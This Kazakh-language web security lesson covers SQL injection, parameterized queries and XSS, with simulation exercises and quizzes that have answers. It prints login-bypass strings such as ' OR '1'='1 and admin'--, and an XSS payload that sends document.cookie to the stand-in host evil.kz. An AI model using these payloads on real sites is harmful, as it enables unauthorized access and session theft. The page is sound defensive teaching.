Injection & XSS

Ең көп тараған веб-шабуылдар: дерек код болып орындалғанда.

3D симуляцияны ашу Дәрісті оқу

  1. SQL injection
  2. Параметрлер
  3. XSS

1SQL injection

Идея

SQL injection: бағдарлама пайдаланушы енгізген мәтінді SQL сұранысына жай жапсырады:

"SELECT * FROM users WHERE login = '" + login + "' AND password = '" + pass + "'"

Мәтінде тырнақша (') болса, ол жолдың шекарасын бұзып, код бола бастайды.

Түйсік

Сен формаға «аты» жазасың, ал бағдарлама оны бұйрық ретінде оқиды. Банкке «Менің атым: Асан. Және барлық ақшаны маған аудар» деп жазғандай.

Есептеп көрейік

Логин: ' OR '1'='1, құпиясөз: ' OR '1'='1. Сұраныс:

SELECT * FROM users
WHERE login = '' OR '1'='1' AND password = '' OR '1'='1'

AND OR-дан бұрын орындалады: login = '' OR ('1'='1' AND password = '') OR '1'='1': соңғы шарт әрдайым ақиқат. Бірінші жол: admin: қайтарылады.

Тағы бір классика: логин admin'--. --: SQL түсініктемесі, құпиясөз тексерісі жоғалады.

Нақты әлемде

OWASP Top 10 тізімінде injection 2003 жылдан бері бар. TalkTalk (2015, 157 000 клиент), Sony Pictures (2011): SQL injection. 2024 жылы да жаңа осалдықтардың маңызды бөлігі.

⚠ Жиі қате: «біздің пайдаланушылар мұндай нәрсе жазбайды». Шабуылшылар: автоматтандырылған сканерлер, олар бәрін жазады.

Енді сен

Құпиясөзді білмей admin болып кір. Сұраныстың құрылымына қара: тырнақшаларыңыз қай жерде «шығып кетті»?

3D симуляцияда орында

  • Құпиясөзді білмей admin болып кір
Симуляцияны ашу

Өзіңді тексер

Неге ' OR '1'='1 барлық жолды «сәйкес» етеді?

Жауабы мен түсіндірмесі

Дұрыс жауап: OR-дың бір жағы ('1'='1') әрдайым ақиқат

WHERE шарты әр жол үшін ақиқат болады, сондықтан сұраныс бүкіл кестені қайтарады; бағдарлама бірінші жолды (admin) «кірді» деп санайды.

admin'-- логиніндегі -- не істейді?

Жауабы мен түсіндірмесі

Дұрыс жауап: Сұраныстың қалған бөлігін (құпиясөз тексерісін) түсініктемеге айналдырады

SQL-де -- жолдың соңына дейінгі мәтінді елемейді. Сұраныс WHERE login = 'admin' болып қалады.

2Параметрлер

Идея

Түзету: параметрленген сұраныстар (prepared statements):

db.query("SELECT * FROM users WHERE login = ? AND password = ?", [login, pass])

Дерекқор алдымен сұраныстың құрылымын талдайды, сосын мәндерді тек дерек ретінде қояды. Тырнақша: жай таңба, ол ешқашан кодқа айналмайды.

Түйсік

Бланк: «Аты: ______». Бос орынға не жазсаң да, ол бланктің құрылымын өзгертпейді. Жапсыру: бланкті қолмен қайта жазу; параметр: бос орынды толтыру.

Есептеп көрейік

Параметрлермен логин ' OR '1'='1 → дерекқор «' OR '1'='1» деген аты бар пайдаланушыны іздейді. Ондай жоқ: кіру сәтсіз.

Неге «тырнақшаларды тазалау» жеткіліксіз? \' экрандау, Unicode тырнақшалары, сандық өрістер (WHERE id = 1 OR 1=1: тырнақшасыз!), екінші ретті injection (сақталған дерек кейін сұранысқа түседі)…

Нақты әлемде

Барлық заманауи кітапханалар параметрлерді қолдайды: JDBC PreparedStatement, Python DB-API, node-postgres $1. ORM-дер (Prisma, Django ORM) оларды автоматты қолданады. Бұл курстың Web зертханасындағы SQL қозғалтқышы да параметрлермен жұмыс істейді.

💡 Түйін: бұл қағида бар жерде: SQL, shell командалары, HTML, LDAP: дерек пен кодты ешқашан мәтінмен жапсырма.

Енді сен

Параметрлерді қос та, сол шабуылды қайтала. Кіре алмауың керек.

3D симуляцияда орында

  • Параметрлерді қос да, сол шабуылды қайтала: кіре алмауың керек
Симуляцияны ашу

Өзіңді тексер

«Тырнақшаларды жою» неге WHERE id = <енгізу> сұранысын қорғамайды?

Жауабы мен түсіндірмесі

Дұрыс жауап: Сандық өрісте тырнақша керек емес: 1 OR 1=1 жұмыс істейді

Тырнақша: тек бір жол. Нақты қорғаныс: құрылымды деректен бөлу (параметрлер).

SQL injection, command injection және XSS-тің ортақ себебі не?

Жауабы мен түсіндірмесі

Дұрыс жауап: Дерек код ретінде түсіндірілетін контекске экрандаусыз жапсырылады

Барлық injection: бір класс: деректі кодтан бөлмеу. Шешімі де бір: параметрлер, экрандау, қауіпсіз API.

3XSS

Идея

XSS (cross-site scripting): шабуылшы сайтқа скрипт жазады (пікір, профиль аты), ал сайт оны басқа пайдаланушылардың браузерінде HTML ретінде көрсетеді. Скрипт олардың сессиясымен орындалады.

Түйсік

Ортақ тақтаға біреу «Бұл жазуды оқыған адам маған әмиянын берсін» деп жазды: ал оқыған адамдар (браузерлер) бұйрықты орындайды.

Есептеп көрейік

Пікір: <script>fetch('https://evil.kz/?c=' + document.cookie)</script>

  • Қорғаныссыз: браузер <script> тегін көріп, кодты орындайды: сессия cookie-і шабуылшыға кетеді
  • Экрандаумен: < → &lt;, > → &gt;: браузер &lt;script&gt; мәтінін көрсетеді, бірақ орындамайды

Script тегінсіз де болады: <img src=x onerror="...">.

Нақты әлемде

Samy worm (MySpace, 2005): XSS арқылы 20 сағатта 1 млн профильге таралды. React, Vue, Angular мәтінді әдепкіде экрандайды: сондықтан React-тағы dangerouslySetInnerHTML «қауіпті» деп аталған. Бұл курстағы сабақ мәтіндері де (Prose компоненті) HTML емес, тек React элементтерін жасайды: авторлық сабақтар XSS енгізе алмайды.

Қосымша қорғаныс: Content-Security-Policy тақырыбы (inline скриптке тыйым), HttpOnly cookie (JavaScript оқи алмайды).

⚠ Жиі қате: тек кірісте «тазалау». Экрандау шығыста, контекске сай болуы керек: HTML, атрибут, URL, JavaScript: әрқайсысына өз ережесі.

Енді сен

Скрипті бар пікірді алдымен қорғаныссыз, сосын экрандаумен жарияла. Айырмасын көр.

3D симуляцияда орында

  • Скрипті бар пікірді қорғаныссыз жарияла
  • Экрандауды қосып, сол пікірді қайта жарияла
Симуляцияны ашу

Өзіңді тексер

<b>сәлем</b> мәтіні экрандалғаннан кейін браузерде қалай көрінеді?

Жауабы мен түсіндірмесі

Дұрыс жауап: <b>сәлем</b>: тегтерімен мәтін ретінде

&lt;b&gt; браузерге «< таңбасын көрсет» дейді, тег ашпайды. Пайдаланушы не жазса, дәл соны көреді.

HttpOnly cookie XSS-тен қалай қорғайды?

Жауабы мен түсіндірмесі

Дұрыс жауап: JavaScript document.cookie арқылы оны оқи алмайды: сессияны ұрлау қиындайды

Бұл: зиянды азайтатын қабат: XSS бәрібір басқа зиян келтіре алады, бірақ сессия cookie-ін ұрлай алмайды. Негізгі қорғаныс: экрандау.
